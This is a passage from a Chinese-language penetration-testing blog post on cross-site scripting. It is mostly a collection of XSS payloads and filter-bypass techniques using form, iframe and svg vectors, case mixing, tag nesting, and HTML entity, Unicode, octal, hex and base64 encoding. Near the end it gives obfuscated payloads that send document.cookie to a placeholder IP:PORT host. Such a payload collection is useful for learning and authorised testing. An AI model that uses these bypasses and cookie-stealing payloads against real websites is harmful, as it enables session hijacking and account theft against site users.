+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;) method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;prompt(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form action&#x3D;1 onmouseover&#x3D;alert(&#39;xss)&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;iframe&gt;</code>标签</p>
+<p>XSS利用方式1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);height&#x3D;5width&#x3D;1000 &#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;aaa&quot; onmouseover&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;javascript&amp;colon;prompt&amp;lpar;&#96;xss&#96;&amp;rpar;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>svg&lt;&gt;</code>标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><p>绕过思路有很多,但是分类却有点难,实在是不知道怎么去定义每一类的绕过思路。</p>
+<h5 id="1、过滤关键字"><a href="#1、过滤关键字" class="headerlink" title="1、过滤关键字"></a>1、过滤关键字</h5><ul>
+<li><p>大小写绕过、大小写混合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;&#x2F;sCRipT&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>嵌套,也就是重复</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>代替</p>
+<p>iframe就可以代替script<br>confirm和prompt可以代替alert</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;details/open/ontoggle=top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="number">1</span>)&gt; 谷歌浏览器 【绕阿里云XSS】</span><br><span class="line">&lt;svg/onload=prompt(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;style onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;iframe src=javascript:alert`<span class="number">1</span>`&gt;</span><br><span class="line">&lt;body onload=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">&lt;<span class="keyword">select</span> autofocus onfocus=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;script&gt;confirm(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>HTML5 新增的实体命名编码</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;colon; =&gt; [冒号]</span><br><span class="line"></span><br><span class="line">&amp;NewLine; =&gt; [换行]</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span>: &lt;a href=<span class="string">&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>编码</p>
+<p>HTML实体可以使用十进制与十六进制编码;</p>
+<p>javascript可以使用Unicode与八进制与十六进制进行编码.</p>
+<p><code>eval()</code>函数可计算某个字符串,并执行其中的的 JavaScript 代码,可以吧js代码转化为jsunicode,jsunicode可以使用网站<code>http://web.chacuo.net/charsetjsascii</code></p>
+<p>将payload进行进制转化,十六进制前面+<code>&amp;#x</code>,十进制+<code>&amp;#</code></p>
+<p><strong>对于JS编码</strong></p>
+<ul>
+<li><p>unicode配合js的eval函数</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  &lt;img src=<span class="string">&quot;1&quot;</span> onerror=eval(<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#117;&amp;#110;&amp;#105;&amp;#99;&amp;#111;&amp;#100;&amp;#101;&amp;#39;&amp;#41;&quot;</span>)&gt;&lt;/img&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;1&quot;</span> onerror=eval(<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0027\u0029&quot;</span>)&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>八进制与十六进制编码</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(<span class="string">&quot;\141\154\145\162\164\50\57\170\163\163\57\51&quot;</span>);&lt;/script&gt;（JS八进制编码）</span><br></pre></td></tr></table></figure>
+<script>eval("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29");</script>（JS十六进制编码）
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- String.fromCharCode</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;csharp</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(String.fromCharCode(97,108,101,114,116,40,39,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,10 1,39,41))&gt;&lt;&#x2F;img&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>data协议</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgnZGF0YSBwcm90b2NvbCcpPC9zY3JpcHQ+&quot;&gt;&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><strong>对html编码</strong></p>
+<ul>
+<li><p>十进制与十六进制</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;</span>&gt;  （HTML实体十进制编码)</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt; (HTML实体十六进制编码)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**js特性**</span><br><span class="line"></span><br><span class="line">| Payload                                          | 效果                   |</span><br><span class="line">| ------------------------------------------------ | ---------------------- |</span><br><span class="line">| &#96;&#39;alert(&quot;xss&quot;)&#39;.replace(&#x2F;.*&#x2F;g,eval)&#96;             | &#96;eval(&#39;alert(&quot;xss&quot;)&#39;)&#96; |</span><br><span class="line">| &#96;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&#96;                    | &#96;alert(1)&#96;             |</span><br><span class="line">| &#96;&#39;bbbalert(1)cccc&#39;.replace(&#x2F;a\w&#123;4&#125;\(\d\)&#x2F;,eval)&#96; | &#96;eval(&#39;alert(1)&#39;)&#96;     |</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;csharp</span><br><span class="line">&lt;script&gt;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="2、过滤符号"><a href="#2、过滤符号" class="headerlink" title="2、过滤符号"></a>2、过滤符号</h5><ul>
+<li><p>过滤空格</p>
+<h6 id="用-或者"><a href="#用-或者" class="headerlink" title="用/**/或者/"></a>用<code>/**/</code>或者<code>/</code></h6><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;1&quot;</span>/onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt;</span><br><span class="line">&lt;img<span class="comment">/**/</span>src=<span class="string">&quot;1&quot;</span><span class="comment">/**/</span>onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h5 id="3、常用函数"><a href="#3、常用函数" class="headerlink" title="3、常用函数"></a>3、常用函数</h5><ul>
+<li><p>atob()与btoa()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">atob(<span class="string">&quot;L2h0dHA6Lw==&quot;</span>)</span><br><span class="line"><span class="string">&quot;/http:/&quot;</span></span><br><span class="line">btoa(/http:/)</span><br><span class="line"><span class="string">&quot;L2h0dHA6Lw==&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 JavaScript 中，有两个函数被分别用来处理解码和编码 base64 字符串：</p>
+<ul>
+<li>atob() //ASCII to Base64</li>
+<li>btoa() //Base64 to ASCII</li>
+</ul>
+</li>
+<li><p>slice()</p>
+<p>slice() 方法可从已有的数组中返回选定的元素</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arrayObject.slice(start,end)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atob(btoa(&#x2F;http:&#x2F;)).slice(1).concat(&#x2F;IP:PORT&#x2F;).concat(eval(atob(btoa(&#x2F;docum&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ent.cookie&#x2F;)).slice(1,-1))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200621144413840.png" alt="image-20200621144413840"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;location.href&#x3D;eval(atob(btoa(&#x2F;docu&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ment.cookie&#x2F;)).slice(1,-1)))&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200621153113215.png" alt="image-20200621153113215"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://s1eady.top/2018/12/26/xss/" title="xss漏洞" target="_blank" rel="external">http://s1eady.top/2018/12/26/xss/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/1.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">果冻</span><small class="ml-1x">Penetration Testing</small></a></h3>
+        <div>一往情深深几许。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2019/01/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECSP/" title="同源策略与CSP"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2018/12/12/Linux%E5%91%BD%E4%BB%A4/" title="Linux命令"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">
+        <span>[&nbsp;</span><span>文章目录</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/2.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/1.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="/GXA111666" target="_blank" title="VX" data-toggle=tooltip data-placement=top><i class="icon icon-VX"></i></a></li>
+        
+        <li><a href="/1252195810" target="_blank" title="QQ" data-toggle=tooltip data-placement=top><i class="icon icon-QQ"></i></a></li>
+        
+        <li><a href="/1252195810@qq.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-mail"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
